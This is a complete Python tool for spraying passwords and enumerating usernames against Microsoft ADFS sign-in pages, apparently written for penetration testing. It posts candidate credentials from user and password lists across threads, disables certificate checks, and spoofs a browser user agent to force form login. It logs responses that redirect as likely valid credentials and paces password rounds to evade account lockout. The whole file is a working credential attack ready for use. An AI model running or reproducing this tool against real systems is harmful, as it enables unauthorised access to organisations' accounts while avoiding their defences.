#!/usr/bin/env python3

import re
import sys
import logging
import argparse
import time
import random
import string
import requests
import urllib3
from threading import Thread
from queue import Queue
from pdb import set_trace

__version__ = "0.11"
__license__ = "MIT"

class ThreadPool:
	def __init__(self, num_threads, enum_args):
		self.tasks = Queue(num_threads)
		enum_args['tasks'] = self.tasks
		for idx in range(num_threads):
			enum_args['thread_id'] = idx
			a = ADFSEnum()
			a.setup(**enum_args)
			a.start()

	def add_task(self, username, password):
		self.tasks.put((username, password))
	
	def wait_completion(self):
		self.tasks.join()

class ADFSEnum(Thread):

	def __init__(self):
		Thread.__init__(self)
		self.daemon = True

	def setup(self, **kwargs):
		required = ['adfs_url', 'ad_domain', 'timeout', 'delay',
			'party_id', 'http_log_enabled', 'thread_id', 'tasks']
		for r in required:
			if r not in kwargs.keys():
				raise Exception(f'Missing keyword argument: `{r}`')
		self.__dict__.update(kwargs)

		self.adfs_url = self.adfs_url if self.adfs_url[-1] != '/' else self.adfs_url[:-1]
		self.legacy_ad_fmt = False if '.' in self.ad_domain else True
		self.relay_login = bool(self.party_id)
		self.sess = requests.Session()
		self.login_ctr = 0 # total number of logins per this thread
		self.headers = {
			# if Windows user agent is used, init_party_login initiates NTLM auth
			# and not by HTML form
			'User-Agent': ('Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) '+
								'AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4')
		}
		self.info_logger = logging.getLogger('run')
		self.http_logger = logging.getLogger('http') if bool(self.http_log_enabled) else None

	def run(self):
		self.init_party_login()
		username, password = self.tasks.get()
		# make one login request to find if all is setup well
		self.dummy_login(password) 
		self.login(username, password)
		self.tasks.task_done()

		while True:
			# threads get killed once process ends
			username, password = self.tasks.get()
			self.login(username, password)
			self.tasks.task_done()

	def log(self, msg):
		self.info_logger.info('#{:02d} {}'.format(self.thread_id, msg))

	def log_http(self, resp):
		if not self.http_log_enabled:
			return
		req = resp.request
		out = ""
		out += "\n--REQUEST--\n"
		out += f"{req.method} {req.url}\n"
		out += '\n'.join([f"{k}: {req.headers[k]}" for k in req.headers.keys()])
		out += '\n\n'
		out += str(req.body)
		out += "\n--RESPONSE--\n"
		out += f"{resp.status_code}\n"
		out += '\n'.join([f"{k}: {resp.headers[k]}" for k in resp.headers.keys()])
		out += str(resp.text)
		out += '\n------------------------------------------\n'
		self.http_logger.info('#{:02d} {}'.format(self.thread_id, out))

	def login(self, username, password, dummy_login=False):
		if self.legacy_ad_fmt:
			username = "{}\\{}".format(self.ad_domain, username)
		else:
			username = "{}@{}".format(username, self.ad_domain)

		params = {
			'UserName': username,
			'Password': password,
			'AuthMethod': 'FormsAuthentication'
		}

		url = self.adfs_url + '/adfs/ls/idpinitiatedsignon.aspx'
		resp_code, time_took, success = 0, self.timeout, False

		try:
				t1 = time.time()
				resp = self.sess.post(url, data=params, headers=self.headers, 
						timeout=self.timeout, verify=False, allow_redirects=False)

				self.log_http(resp)
				hdrs = resp.headers
				resp_code = resp.status_code
				resp_text = resp.text
				time_took = time.time() - t1

				if time_took == self.timeout:
					success = False
				else:
					success = resp_code == 302

		except requests.exceptions.Timeout:
			resp_code = 900
			time_took = self.timeout
			
		finally:
			self.log("{:03d} {:3.3f}s {} {} {}".format(resp_code,time_took,
					'--' if time_took == self.timeout else 'ok', username, password))

		if success and not dummy_login:
			self.log(f"Likely valid credentials {username}:{password}")
			# might be correct password, reinit
			self.init_party_login()

		self.login_ctr += 1
		if self.login_ctr > 100:
			self.login_ctr = 0
			# try every once in a while to see if all is going normally
			self.dummy_login(password)

		if self.delay != 0:
			time.sleep(self.delay)

	def init_party_login(self):
		self.sess.cookies.clear()
		if self.relay_login:
			params = {
					'SignInOtherSite': 'SignInOtherSite',
					'RelyingParty': self.party_id,
					'SignInSubmit': 'Sign in',
					'SingleSignOut': 'SingleSignOut'
			}
		else:
			params = {
				'SignInIdpSite': 'SignInIdpSite',
				'SignInSubmit': 'Sign in',
				'SingleSignOut': 'SingleSignOut'
			}

		url = self.adfs_url + '/adfs/ls/idpinitiatedsignon.aspx'
		response = self.sess.post(url, data=params, headers=self.headers, verify=False)
		self.log_http(response)
		if response.status_code != 200:
			raise Exception('Unable to init login party')

		self.log("Initialized new session")

	def rand_user(self):
		return 'zz'+''.join(random.choices(string.ascii_lowercase + string.digits, k=15))

	def dummy_login(self, password):
		username = self.rand_user()
		self.login(username, password, True)

def setup_logger(logger_name):
	# https://stackoverflow.com/questions/11232230/logging-to-two-files-with-different-settings/11233293
	log_fname = logger_name+'_'+str(time.time())+str(random.random())[2:6]+'.log'
	handler = logging.FileHandler(log_fname)
	fmt = logging.Formatter(fmt='%(asctime)s.%(msecs)03d %(message)s',
													datefmt='%Y-%m-%d %H:%M:%S')
	handler.setFormatter(fmt)

	logger = logging.getLogger(logger_name)
	logger.setLevel(logging.INFO)
	logger.addHandler(handler)
		 
if __name__ == '__main__':
	ap = argparse.ArgumentParser(description='Spray passwords or enumerate usernames on ADFS')
	ap.add_argument('-u', '--user-list', required=True, dest='user_list', help='Username list path')
	ap.add_argument('-D', '--ad-domain', required=True, dest='ad_domain',
									help=('AD domain used to add before/after usernames. Example: CONTOSO will make' +
												' username CONTOSO\\user1, contoso.local will make username user1@contoso.local'))
	ap.add_argument('-a', '--adfs-url', required=True, dest='adfs_url', help='URL to ADFS, e.g. https://sts.contoso.com/')
	ap.add_argument('-p', '--password', dest='password', help='Password', default='P@ssw0rd')
	ap.add_argument('-pf', '--password-file', dest='pwfile', help='Password file', default=None)
	ap.add_argument('-pd', '--password-file-delay', dest='pf_delay',
									help='Guaranteed delay in seconds between starting to spray another password in Password file',
									type=int, default=1800)
	ap.add_argument('-t', '--timeout', dest='timeout', help='Timeout in seconds for each sent request', type=float, default=3)
	ap.add_argument('-d', '--delay', dest='delay', help='Delay in seconds between each sent request', type=int, default=0)
	ap.add_argument('-i', '--party-id', dest='pid',
									help='ADFS Party ID. If not present, the tool will login directly into ADFS and not attempt to login to one of relay parties')
	ap.add_argument('-l', '--http-log', dest='http_log_enabled', help='Log all HTTP request-response to file on top of regular log', default=False, action='store_true')
	ap.add_argument('-c', '--concurrency', dest='thread_cnt', help='Number of threads to use', default=1, type=int)
	ap.add_argument('-g', '--guarantee-password-delay', dest='g_delay',
									help='Ensure Password file delay value is met for all users', default=False, action='store_true')
	# TODO parse all relay party alternatives

	urllib3.disable_warnings()
	args = ap.parse_args()

	if args.pf_delay < 0:
		print("[x] Invalid password file delay value")
		sys.exit(1)

	if (args.delay > 0) and (args.thread_cnt > 1):
		print("[?] Delay bigger than zero with multiple threads "+
					"doesn't make much sense. Just saying...")

	userlist = []
	with open(args.user_list) as f:
		userlist = f.read().split("\n")
	if userlist[-1] == '':
		userlist = userlist[:-1]

	for username in userlist:
		if '\\' in username or '@' in username:
			raise Exception('It seems like supplied username format is wrong,'+
								' -D switch will prepend/append domain. Failed at username \'{}\''.format(username))

	setup_logger('run')
	if args.http_log_enabled:
		setup_logger('http')
	logger = logging.getLogger('run')
	logger.info(f"Starting {sys.argv}")

	KWARGS = {
		'adfs_url': args.adfs_url,
    'ad_domain': args.ad_domain,
    'timeout': args.timeout,
    'delay': args.delay,
    'party_id': args.pid,
    'http_log_enabled': args.http_log_enabled
	}
	POOL = ThreadPool(args.thread_cnt, KWARGS)
	def try_logins(userlist, password):
		for username in userlist:
			POOL.add_task(username, password)
		POOL.wait_completion()
		logger.info("--------------- Done spraying with {} --------------".format(password))

	if args.pwfile is not None:
		passwords = open(args.pwfile, 'r').read().split("\n")
		if passwords[-1] == '':
			passwords = passwords[:-1]
		for idx, password in enumerate(passwords):
			tim = time.time()
			try_logins(userlist, password)
			if args.g_delay:
				# make sure password delay is met by starting delay counter after
				# all spraying with one password  is done
				tim = time.time()
				took = 0
			else:
				# this might bring issues if try_logins take a lot of time (e.g. timeouts)
				took = time.time() - tim
			# don't wait after last password
			while took < args.pf_delay and idx != (len(passwords)-1):
				time.sleep(30)
				took = time.time() - tim

	else:
		try_logins(userlist, args.password)

	logger.info("Finished")
